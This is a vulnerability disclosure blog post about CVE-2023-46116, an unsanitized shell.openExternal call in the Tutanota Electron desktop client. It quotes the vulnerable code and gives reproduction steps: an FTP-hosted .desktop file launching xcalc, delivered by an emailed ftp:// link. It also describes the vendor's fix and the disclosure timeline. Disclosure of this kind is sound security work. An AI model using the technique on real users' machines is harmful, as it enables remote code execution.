---
title: "The Plight of Unsanitized Function Calls"
date: "2023-10-22T21:28:41+05:30"
author: "Prajyot Chemburkar"
cover:
    image: "images/cover.png" 
    alt: "some image that didn't load"
    caption: "relevant xkcd - exploits of a mom"
    responsiveImages: false
tags: ["Electron", "CVE", "RCE"]
keywords: ["electron", "code execution"]
description: "Been researching electron app security recently, decided to look at Tutanota."
showFullContent: true
readingTime: true
draft: false
showToc: true
tocOpen: true
showReadingTime: true
hideSummary: true
---

# Introduction
*Tutanota is the world's most secure email service, easy to use and private by design. You get fully encrypted calendars and contacts with all our personal and business email accounts.* ~[The Tutanota Website](https://tutanota.com/)

# Debugging Setup
Tutanota fortunately is open source. So all you have to do is download the application source, spin up vscode or any IDE of your liking and read away. Or you can use [grep.app](https://grep.app) to look at its code, which is what I did in this case.

I particularly like using Ubuntu with the XFCE desktop environment, as it makes it simpler to demonstrate exploits, as we will see later.

# Methodology
My methodology for reviewing electron applications, at least when it comes to *electron specific* vulnerabilities, is quite simple: Use a bottom up approach. Grep for sinks and then trace the source.

# Stumbling Upon a Sink
One of the common functions that developers use in electron apps is `openExternal` from the `shell` module. This function opens URLs' using their default or native applications. As an example, if you pass a URL with the `https:` scheme, `shell.openExternal` will spawn your default browser to open it.

The problem with this is, if developers do not sanitize this function call, and pass it user-controlled URLs', then an attacker may make use of schemes like `file:`, `ftp:`, `smb:`, etc. to gain code execution on a victim's computer. There's a ton of URL schemes availble that can be used to abuse this "feature", more on that [here](https://positive.security/blog/url-open-rce).

I found this unsanitized call to `shell.openExternal` in Tutanota's source:

```js
private onNewWindow(details: HandlerDetails): { action: "deny" } {
    const parsedUrl = parseUrlOrNull(details.url)

    if (parsedUrl == null) {
        log.warn(TAG, "Could not parse url for new-window, will not open")
    } else if (parsedUrl.protocol === "file:") {
        // this also works for raw file paths without protocol
        log.warn(TAG, "prevented file url from being opened by shell")
    } else {
        // we never open any new windows directly from the renderer
        // except for links in mails etc. so open them in the browser
        this.electron.shell.openExternal(parsedUrl.toString()).catch((e) => {
            log.warn("failed to open external url", details.url, e)
            this.electron.dialog.showMessageBox({
                title: lang.get("showURL_alt"),
                buttons: [lang.get("ok_action")],
                defaultId: 0,
                message: lang.get("couldNotOpenLink_msg", { "{link}": details.url }),
                type: "error",
            })
        })
    }

    return {
        action: "deny",
    }
}
```

Looks like the devs are sort of aware of what `shell.openExternal` can do, hence the blocked `file:` scheme. But there are way too many other schemes that we can use to abuse this.

# Using FTP to gain RCE
Execute and authenticate to the Tutanota desktop version `3.118.8` AppImage on a Ubuntu Desktop with the XFCE environment.
![tuta-install](images/tuta-install.png)

On another machine, host an FTP server with anonymous access enabled. Create and place a `pwn.desktop` file in the FTP root, with the following content:
```sh
[Desktop Entry]
Exec=xcalc
Type=Application
```

Send an email to the email account logged in on tutanota containing a hyperlink pointing to the `pwn.desktop` file on the FTP server. Replace the corresponding values in the hyperlink: `ftp://username:password@ip-address/pwn.desktop`.
![tuta-send-mail](images/tuta-send-mail.png)

On the tutanota desktop application, click on the hyperlink in the email received. Observe that the calculator application opens. You may need to confirm execution of the application in some cases.
![tuta-rce](images/tuta-rce.png)

# The Fix Deployed
Tutanota decided to fix the issue by adding a warning/confirmation dialouge before opening any links that are not http/https. This seemed like a good fix to me, as:
- It is confirmed that the user actually wants to open said link.
- It does not affect the use of legitimate deeplinks.

# Timeline
- September 26th 2023, 7:20 AM UTC, Reported to Tutanota
- September 26th 2023, 9:33 AM UTC, Fixed by Tutanota
- October 20th 2023, CVE-2023-46116 assigned
- December 15th 2023, Report disclosed